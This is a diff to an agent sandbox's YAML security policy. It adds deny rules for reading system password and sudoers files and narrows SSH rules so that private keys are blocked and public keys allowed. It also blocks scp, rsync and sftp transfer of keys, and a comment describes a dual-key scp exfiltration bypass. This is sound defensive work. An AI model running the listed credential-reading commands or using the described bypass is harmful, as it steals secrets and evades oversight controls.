@@ -272,6 +272,19 @@ policies:
             - "**/.keys/**"
             - "**/.pki/**"
         message: "Credential file access blocked"
+      # System authentication / privilege files
+      - action: deny
+        when:
+          path_matches:
+            - "**/etc/shadow"
+            - "**/etc/shadow-"
+            - "**/etc/gshadow"
+            - "**/etc/gshadow-"
+            - "**/etc/passwd"
+            - "**/etc/sudoers"
+            - "**/etc/sudoers.d/**"
+            - "**/etc/master.passwd"
+        message: "Sensitive system file blocked"
       # macOS-specific sensitive paths
       - action: deny
         when:
@@ -287,18 +300,53 @@ policies:
     match:
       tool: ["exec"]
     rules:
+      # Block SSH private key access (allow .pub files)
       - action: deny
         when:
           command_matches:
-            # SSH keys
-            - "cat **/.ssh/**"
-            - "head **/.ssh/**"
-            - "tail **/.ssh/**"
-            - "less **/.ssh/**"
-            - "more **/.ssh/**"
-            - "base64 **/.ssh/**"
-            - "cp **/.ssh/**"
-            - "**/.ssh/id_*"
+            - "cat **/.ssh/id_*"
+            - "head **/.ssh/id_*"
+            - "tail **/.ssh/id_*"
+            - "less **/.ssh/id_*"
+            - "more **/.ssh/id_*"
+            - "base64 **/.ssh/id_*"
+            - "cp **/.ssh/id_*"
+            - "*mv*/.ssh/id_*"
+            - "xxd **/.ssh/id_*"
+            - "hexdump **/.ssh/id_*"
+            - "od **/.ssh/id_*"
+            - "strings **/.ssh/id_*"
+          command_not_matches:
+            - "cat **/.ssh/*.pub"
+            - "head **/.ssh/*.pub"
+            - "tail **/.ssh/*.pub"
+            - "less **/.ssh/*.pub"
+            - "more **/.ssh/*.pub"
+            - "base64 **/.ssh/*.pub"
+            - "cp **/.ssh/*.pub"
+            - "*mv*/.ssh/*.pub"
+            - "xxd **/.ssh/*.pub"
+            - "hexdump **/.ssh/*.pub"
+            - "od **/.ssh/*.pub"
+            - "strings **/.ssh/*.pub"
+        message: "SSH private key access blocked"
+      # Block scp/rsync/sftp exfil of SSH keys
+      # Note: -i flag exclusion removed — it's bypassable via dual-key attacks
+      # (scp -i auth_key exfil_key remote:). Users needing -i can use ssh-agent
+      # or add a local policy override.
+      - action: deny
+        when:
+          command_matches:
+            - "*scp*/.ssh/id_*"
+            - "*rsync*/.ssh/id_*"
+            - "*sftp*/.ssh/id_*"
+          command_not_matches:
+            - "*.pub *"
+            - "*.pub"
+        message: "SSH key transfer blocked"
+      - action: deny
+        when:
+          command_matches:
             # AWS / cloud creds
             - "cat **/.aws/**"
             - "base64 **/.aws/**"
@@ -340,7 +388,6 @@ policies:
             # Process environment (can contain secrets)
             - "cat /proc/**/environ"
           command_not_matches:
-            # Allow .pub files — public keys are not sensitive.
             - "**/.ssh/*.pub"
         message: "Credential file access via shell blocked"
 
